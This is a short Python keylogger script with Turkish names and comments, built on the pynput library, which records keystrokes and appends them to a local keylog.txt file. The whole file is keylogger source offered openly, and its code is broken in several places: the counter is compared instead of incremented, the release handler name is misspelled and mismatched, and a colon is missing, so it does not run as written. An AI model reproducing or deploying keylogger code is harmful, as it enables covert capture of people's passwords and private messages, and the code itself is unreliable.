import pynput
from pynput.keyboard import Key,Listener
sayac = 0
keys = []
def on_press(key):
	global sayac,keys
	sayac == sayac + 1
	print("{0} oltayageldi".format(key))
	keys.append(key)
	if sayac >=15:
		sayac = 0
		dosya_yaz(keys)
		keys=[]
def dosya_yaz(keys):
	with open("keylog.txt", "a", encoding = "utf-8") as file:
		for key in keys:
			k = str(key).replace("'","")
			if k.find("space") > 0:
				file.write("\n")
			elif k.find("Key") == -1:
				file.write(k)
def on_realese(key):
	if key== Key.esc:
		return False
with Listener(on_press = on_press, on_realease = on_realease) as listener
	listener.join()

#ctrl+c ile de çıkış yapabilirsiniz.